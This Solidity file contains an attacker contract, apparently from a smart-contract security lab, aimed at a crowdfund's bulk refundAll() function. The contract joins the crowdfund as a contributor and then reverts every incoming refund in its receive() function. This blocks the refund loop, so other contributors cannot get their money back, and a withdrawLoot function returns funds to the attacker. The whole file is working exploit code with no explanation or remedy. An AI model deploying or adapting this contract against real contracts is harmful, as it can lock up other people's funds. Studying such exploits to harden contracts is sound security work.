// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

interface ICrowdfundBulkRefund {
    function contribute() external payable;
    function refundAll() external;
}

contract Attack2DoSAttacker {
    address payable public attacker;
    ICrowdfundBulkRefund public vulnerable;

    modifier onlyAttacker() {
        require(msg.sender == attacker, "Not attacker");
        _;
    }

    event JoinedCrowdfund(address indexed attacker, uint256 amount);
    event RefundAllBlocked(address indexed attacker);

    constructor(address _vulnerable, address _attacker) {
        attacker = payable(_attacker);
        vulnerable = ICrowdfundBulkRefund(_vulnerable);
    }

    // STEP 0: EOA funds this contract so it can contribute on-chain
    function fundAttack2() external payable onlyAttacker {}

    // STEP 1: Send ETH from this contract into the crowdfund so the contract
    // address shows up as a contributor (required for the DoS fallback).
    function joinCrowdfund(uint256 amount) external onlyAttacker {
        require(amount > 0, "Amount required");
        require(address(this).balance >= amount, "Not enough balance");

        vulnerable.contribute{value: amount}();
        emit JoinedCrowdfund(attacker, amount);
    }

    // STEP 2: Call refundAll() – the receive() below will revert to block the loop.
    function triggerRefundAll() external onlyAttacker {
        vulnerable.refundAll();
        emit RefundAllBlocked(attacker);
    }

    // STEP 3: Clean up any trapped ETH (if ever sent to the contract directly)
    function withdrawLoot() external onlyAttacker {
        uint256 bal = address(this).balance;
        require(bal > 0, "No balance");
        attacker.transfer(bal);
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }

    // Revert on incoming refunds to block the vulnerable loop
    receive() external payable {
        revert("I refuse refunds");
    }
}